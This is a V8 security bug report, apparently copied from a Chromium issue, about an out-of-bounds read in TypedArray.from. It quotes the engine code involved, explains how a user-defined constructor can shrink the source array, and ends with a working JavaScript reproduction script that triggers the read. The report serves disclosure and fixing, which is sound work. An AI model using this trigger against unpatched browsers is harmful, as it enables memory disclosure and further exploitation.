This is copied from the report in issue 835887:

OOB read in TypedArray.from
--------------------------------------------------------------------------------
https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-typed-array-gen.cc?rcl=8ba3ef5fcd21c5e717a1b7bd0713612a287b9500&l=1705
 ES6 #sec-%typedarray%.from
TF_BUILTIN(TypedArrayFrom, TypedArrayBuiltinsAssembler) {
[...]
    TNode<JSArray> values = CAST(
        CallBuiltin(Builtins::kIterableToList, context, source, iterator_fn));

    // This is not a spec'd limit, so it doesn't particularly matter when we
    // throw the range error for typed array length > MaxSmi.
    TNode<Object> raw_length = LoadJSArrayLength(values);
    GotoIfNot(TaggedIsSmi(raw_length), &if_length_not_smi);

    final_length = CAST(raw_length);
    final_source = values;
    Goto(&create_typed_array);

    BIND(&if_length_not_smi);
    ThrowRangeError(context, MessageTemplate::kInvalidTypedArrayLength,
                    raw_length);
  }
[...]
  BIND(&create_typed_array);
  {
    // 7c/11. Let targetObj be ? TypedArrayCreate(C, «len»).
    target_obj = CreateByLength(context, receiver, final_length.value(),
                                "%TypedArray%.from");

    Branch(mapping.value(), &slow_path, &fast_path);
  }

  BIND(&fast_path);
  {
    Label done(this);
    GotoIf(SmiEqual(final_length.value(), SmiConstant(0)), &done);

    CallRuntime(Runtime::kTypedArrayCopyElements, context, target_obj.value(),
                final_source.value(), final_length.value());
    Goto(&done);

    BIND(&done);
    args.PopAndReturn(target_obj.value());
  }

https://cs.chromium.org/chromium/src/v8/src/elements.cc?rcl=8ba3ef5fcd21c5e717a1b7bd0713612a287b9500&l=3362
  static bool TryCopyElementsFastNumber(Context* context, JSArray* source,
                                        JSTypedArray* destination,
                                        size_t length, uint32_t offset) {
    if (Kind == BIGINT64_ELEMENTS || Kind == BIGUINT64_ELEMENTS) return false;
    Isolate* isolate = source->GetIsolate();
    DisallowHeapAllocation no_gc;
    DisallowJavascriptExecution no_js(isolate);

    ElementsKind kind = source->GetElementsKind();
    BackingStore* dest = BackingStore::cast(destination->elements());
[...]
    if (kind == PACKED_SMI_ELEMENTS) {
      FixedArray* source_store = FixedArray::cast(source->elements());

      for (uint32_t i = 0; i < length; i++) {
        Object* elem = source_store->get(i);
        DCHECK(elem->IsSmi());
        int int_value = Smi::ToInt(elem);
        dest->set(offset + i, dest->from(int_value));
      }
      return true;
[...]
--------------------------------------------------------------------------------

|TypedArrayFrom()| obtains the length of the |source| argument and then calls a user-defined function inside
|CreateByLength()|, which could shrink |source|. If |source| is a fast array, this may cause an OOB read later
in |TryCopyElementsFastNumber()| because it doesn't ensure |length| is still valid.

<b>REPRODUCTION CASE</b>
<script>
oobArray = [];
for (let i = 0; i < 1024 * 1024; ++i) {
  oobArray[i] = 1.1;
}
floatArray = new Float64Array(oobArray.length);
Float64Array.from.call(function(length) {
  oobArray.length = 0;
  return floatArray;
}, oobArray);
</script>